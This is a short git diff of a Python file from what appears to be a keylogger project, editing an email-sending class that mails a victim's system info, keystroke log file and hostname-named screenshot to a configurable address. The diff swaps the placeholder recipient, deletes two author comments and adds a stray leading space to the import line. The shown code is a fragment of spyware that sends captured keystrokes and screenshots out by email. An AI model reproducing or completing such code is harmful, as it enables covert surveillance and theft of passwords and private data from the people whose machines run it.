@@ -1,4 +1,4 @@
-import os, pickle, socket, threading
+ import os, pickle, socket, threading
 
 from mimetypes import guess_type as guess_mime_type
 
@@ -20,11 +20,8 @@ from functions import keyloggerFn
 iPc = info.infoPc()
 keyloggerFn = keyloggerFn.keylogger()
 
-# yea i know, i already put my email 
-# btw i removed this bc is a idiot thing that i made
-
 class sndEmail:
-    def __init__(self, destination='xpto@email', obj='Keylogger',
+    def __init__(self, destination='idkPutSomething@email', obj='Keylogger',
                  body=f'{iPc}', attachments=["logs/log.txt", f"{socket.gethostname()}.png"]):
         self.__destination = destination
         self.__obj = obj
